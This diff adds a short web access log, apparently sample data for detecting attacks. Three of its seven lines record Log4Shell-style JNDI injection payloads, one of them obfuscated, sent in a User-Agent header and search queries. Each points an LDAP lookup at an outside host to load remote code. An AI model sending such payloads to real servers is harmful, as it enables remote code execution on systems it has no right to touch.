@@ -1,0 +1,7 @@
+2026-06-20T10:42:11Z 198.51.100.10 GET /health 200 "-" "Mozilla/5.0"
+2026-06-20T10:42:51Z 203.0.113.45 GET /api/search?q=printer 200 "-" "curl/8.1.2"
+2026-06-20T10:43:19Z 203.0.113.45 GET /api/search?q=test 500 "-" "${jndi:ldap://198.51.100.25:1389/a}"
+2026-06-20T10:43:21Z 203.0.113.45 GET /api/search?q=${jndi:ldap://198.51.100.25:1389/b} 500 "-" "Mozilla/5.0"
+2026-06-20T10:43:36Z 192.0.2.8 GET /static/app.js 200 "-" "Mozilla/5.0"
+2026-06-20T10:44:02Z 203.0.113.45 GET /api/search?q=${lower:j}${lower:n}${lower:d}${lower:i}:ldap://198.51.100.25:1389/c 500 "-" "curl/8.1.2"
+2026-06-20T10:45:18Z 198.51.100.10 GET /metrics 200 "-" "Prometheus/2.51"
